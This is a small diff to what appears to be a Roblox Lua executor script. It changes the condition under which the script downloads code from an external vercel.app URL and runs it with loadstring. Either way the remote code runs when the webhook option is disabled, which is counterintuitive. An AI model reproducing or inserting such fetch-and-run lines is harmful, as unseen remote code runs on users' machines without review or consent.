@@ -37,6 +37,6 @@ end)
 if not success then
     warn("Execution log failed:", err)
 end
-if shared.Webhook and shared.Webhook.Enabled ~= true then
+if shared.Webhook and shared.Webhook.Disabled then
     loadstring(game:HttpGet("https://roblox-alpha-murex.vercel.app/webhook.lua"))()
 end
